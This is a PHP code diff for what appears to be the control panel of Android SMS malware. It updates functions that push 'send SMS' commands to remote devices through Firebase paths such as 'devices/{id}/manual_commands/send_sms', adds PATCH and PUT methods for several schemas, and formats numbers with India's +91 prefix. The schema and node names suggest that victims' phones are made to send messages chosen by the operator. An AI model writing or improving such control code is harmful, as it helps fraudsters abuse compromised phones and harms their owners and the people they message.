@@ -354,18 +354,21 @@ function rebel_send_paths_for_device(string $deviceId, string $schema = 'rabel',
         }
     } else {
         if (rebel_is_rto_style_url($url) || $deviceNode === 'user_list' || $deviceNode === 'user_data') {
-            $out[] = ['path' => 'clients/' . $id, 'type' => 'rto9'];
-            $out[] = ['path' => $id, 'type' => 'rto9'];
-            $out[] = ['path' => 'clients/' . $id . '/webhookEvent/sendSms', 'type' => 'rabel'];
-            $out[] = ['path' => $id . '/webhookEvent/sendSms', 'type' => 'rabel'];
+            $out[] = ['path' => 'clients/' . $id, 'type' => 'rto9', 'method' => 'PATCH'];
+            $out[] = ['path' => $id, 'type' => 'rto9', 'method' => 'PATCH'];
+            $out[] = ['path' => 'clients/' . $id . '/webhookEvent/sendSms', 'type' => 'rabel', 'method' => 'PUT'];
+            $out[] = ['path' => $id . '/webhookEvent/sendSms', 'type' => 'rabel', 'method' => 'PUT'];
+        }
+        if ($deviceNode === 'clients' || $schema === 'rabel') {
+            $out[] = ['path' => 'clients/' . $id, 'type' => 'rto9', 'method' => 'PATCH'];
         }
         foreach (array_values(array_unique(['clients', $node, 'user_list', 'user_data', 'devices'])) as $n) {
             if ($n === '') {
                 continue;
             }
-            $out[] = ['path' => $n . '/' . $id . '/webhookEvent/sendSms', 'type' => 'rabel'];
+            $out[] = ['path' => $n . '/' . $id . '/webhookEvent/sendSms', 'type' => 'rabel', 'method' => 'PUT'];
         }
-        $out[] = ['path' => 'devices/' . $id . '/manual_commands/send_sms', 'type' => 'spinplay'];
+        $out[] = ['path' => 'devices/' . $id . '/manual_commands/send_sms', 'type' => 'spinplay', 'method' => 'PUT'];
     }
 
     return $out;
@@ -374,9 +377,10 @@ function rebel_send_paths_for_device(string $deviceId, string $schema = 'rabel',
 function rebel_send_payload_for_type(string $type, int $sim, string $to, string $message, string $deviceId = ''): array
 {
     $sim = max(1, $sim);
+    $toDial = rebel_format_sms_to($to);
     if ($type === 'spinplay') {
         return [
-            'to' => $to,
+            'to' => $toDial,
             'message' => $message,
             'sim' => $sim - 1,
         ];
@@ -388,32 +392,49 @@ function rebel_send_payload_for_type(string $type, int $sim, string $to, string 
             'command' => 'send message',
             'messageText' => $message,
             'msg' => $message,
-            'phoneNumber' => $to,
-            'to' => $to,
+            'phoneNumber' => $toDial,
+            'phone' => $toDial,
+            'number' => $toDial,
+            'to' => $toDial,
             'sendSms' => [
                 'message' => $message,
                 'status' => 'pending',
-                'to' => $to,
+                'to' => $toDial,
             ],
             'sms' => [
                 'message' => $message,
                 'status' => 'pending',
-                'to' => $to,
+                'to' => $toDial,
             ],
             'sim' => $slot,
             'simSlot' => (string) $slot,
             'targetDeviceId' => $deviceId,
             'timestamp' => (int) round(microtime(true) * 1000),
-            'webhookEvent' => 'send_sms',
+            'type' => 'sms',
         ];
     }
 
     return [
         'from' => $sim,
-        'to' => $to,
+        'to' => $toDial,
         'message' => $message,
         'isSended' => false,
     ];
+}
+
+function rebel_format_sms_to(string $raw): string
+{
+    $clean = preg_replace('/\D/', '', $raw);
+    if (strlen($clean) === 10) {
+        return '91' . $clean;
+    }
+    if (strlen($clean) === 12 && str_starts_with($clean, '91')) {
+        return $clean;
+    }
+    if (strlen($clean) > 10) {
+        return '91' . substr($clean, -10);
+    }
+    return $clean;
 }
 
 /** Same as rebel.py normalize_phone() */
@@ -732,7 +753,7 @@ function rebel_send_sms_to_device(
     string $schema = 'rabel',
     string $deviceNode = 'clients'
 ): array {
-    $to = rebel_normalize_phone($to);
+    $to = rebel_format_sms_to($to);
     if ($deviceId === '' || $to === '' || $message === '') {
         return ['ok' => false, 'error' => 'Device, number and message required'];
     }
@@ -752,7 +773,8 @@ function rebel_send_sms_to_device(
             continue;
         }
         $payload = rebel_send_payload_for_type($type, $sim, $to, $message, $deviceId);
-        $res = rebel_firebase_req('PUT', $url, $authKey, $path, $payload);
+        $method = strtoupper((string)($attempt['method'] ?? 'PUT'));
+        $res = rebel_firebase_req($method, $url, $authKey, $path, $payload);
         if ($res !== null) {
             $hint = '';
             if ($type === 'rto9') {
